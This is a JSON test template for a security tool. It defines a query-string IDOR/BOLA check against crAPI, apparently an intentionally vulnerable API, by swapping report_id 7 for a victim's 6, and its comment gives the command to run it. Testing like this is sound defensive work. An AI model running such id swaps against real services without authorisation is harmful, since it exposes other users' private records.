{
  "_comment": "Real --op template: crAPI query-string IDOR (hand-verified). Attacker reads report_id=7 (their own); the attack swaps only that query id to the victim's 6. Run: `lanivist verify --target <base_url> --spec <crapi-openapi.json> --op examples/op.crapi_mechanic_report.json`. Tokens are prompted (masked), never in this file.",
  "method": "GET",
  "baseline_path": "/workshop/api/mechanic/mechanic_report?report_id=7",
  "body": null,
  "payload": {
    "location": "query_param",
    "target_param": "report_id",
    "payload_string": "6",
    "type": "BOLA"
  },
  "shape": "query_string_idor"
}
